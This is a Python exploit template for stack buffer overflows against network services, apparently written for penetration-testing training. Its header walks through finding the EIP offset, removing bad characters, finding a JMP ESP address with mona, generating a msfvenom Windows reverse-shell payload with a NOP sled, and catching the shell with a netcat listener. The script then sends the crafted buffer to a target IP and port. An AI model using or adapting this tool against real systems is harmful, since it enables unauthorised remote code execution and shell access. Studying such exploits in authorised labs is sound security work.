#=======================================#
#  Exploit script for Buffer Overflows  #
#=======================================#
#
# Usage:
#       1) Insert the ip, port and command to exploit
#       2) With the determined length from fuzzing, create a (longer) pattern
#       3) Insert the pattern as a string in "payload"
#       4) Run the script and extract the offset for the EIP by matching the pattern
#
#       5) Update the "offset" value and enter 4 bytes for the return address ("retip")
#       6) Change the "payload" to "bytearray" (a list of all hex values)
#       7) Run the script and copy the hex dump from the ESP
#             (e.g. Immunite Debugger: ESP->Follow Dump->Mark everything->Copy dump)
#
#    ------------------------------------
#     Identify bad characters in the hex dump (e.g. findbadchars.py)
#    ------------------------------------
#
#       8) To exclude known bad chararacters from sending, add them to "badchars"
#             (e.g. badchars = b'\x00\x01\x02') -> Then run the script again
#
#       9) Find a jump point with mona and add update "retip" (remember little endian)
#             !mona jmp -r esp -cbp "\x00<badchars>"
#      10) Create a payload with msfvenom and update the "payload" with it
#      11) Add a NOP sled in "padding" (e.g. b'\x90' * 16)
#      12) Run the script (and start a nc listener)
#
# Note: Byte strings can be send as is, normal strings must be encoded first!
#       Encoding however, inserts '\\' so do not put byte values in normal strings!
#
#=======================================#

#!/usr/bin/env python3

import re
import socket
import sys



ip        = '10.10.0.01'
port      = 1337
cmd       = 'commando'

timeout   = 5              # seconds

# find the offset with:
#  /usr/share/metasploit-framework/tools/exploit/pattern_query.rb -q [little endian hex decoded value of EIP] -l [pattern length]
offset    = 0
overflow  = 'C' * offset
retip     = b''

# add a NOP sled for the final exploit ('\x90'*16)
padding   = b'\x90' * 0

bytearray = b''.join([bytes([x]) for x in range(0,256)])
badchars  = b'\x00'
# removing bad characters
bytearray = re.sub(b'[' + badchars + b']', b'', bytearray)

# - to find the offset create a payload with:
#      /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [fuzzed length + 400]
# - to find bad chars use the "bytearry" (from above) as payload
# - to exploit the overflow create a payload with msvenom:
#     msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> EXITFUNC=thread -b "\x00<badchars>" -f py
payload   = ''
postfix   = ''

# encoding payload
payload = payload.encode() if isinstance(payload, str) else payload
# assembling buffer
buffer    = cmd + ' ' + overflow
buffer    = buffer.encode() + retip + padding + payload + postfix.encode()


class fc:
        cyan = '\033[96m'
        green = '\033[92m'
        orange = '\033[93m'
        red = '\033[91m'
        end = '\033[0m'
        bold = '\033[1m'

print(f'Exploiting [{fc.cyan}{cmd}{fc.end}] at [{fc.cyan}{ip}{fc.end}:{fc.cyan}{port}{fc.end}] (Timeout set to: {fc.cyan}{timeout}s{fc.end})')
print(f'Final buffer length: {fc.cyan}{len(buffer)}{fc.end}')

try:
        print(f'{fc.cyan}Connecting ...{fc.end}')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))

        print(f'{fc.green}Done.{fc.end}')
        print(f'{fc.cyan}Sending buffer ...{fc.end}')

        s.send(buffer)

        print(f'{fc.green}Done.{fc.end}')
        print(f'{fc.bold}Completed.{fc.end}')

except Exception as e:
        print(f'\tError: {fc.orange}{e}{fc.end}')
        sys.exit(0)

except KeyboardInterrupt:
        print(f'{fc.red}Aborted by user.{fc.end}')
        sys.exit(0)
